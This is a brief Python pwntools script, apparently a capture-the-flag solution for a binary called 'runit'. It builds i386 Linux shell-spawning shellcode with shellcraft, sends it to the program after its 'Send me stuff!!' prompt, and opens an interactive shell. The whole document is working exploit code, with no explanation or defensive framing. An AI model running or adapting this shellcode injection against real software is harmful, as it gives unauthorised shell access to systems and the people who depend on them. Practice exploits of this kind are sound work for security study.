from pwn import *

e = ELF('./runit')

shellcode = asm(shellcraft.i386.linux.sh())

p = process('./runit')

print p.recvuntil('Send me stuff!!\n')
p.sendline(shellcode)
p.interactive()
print p.recv()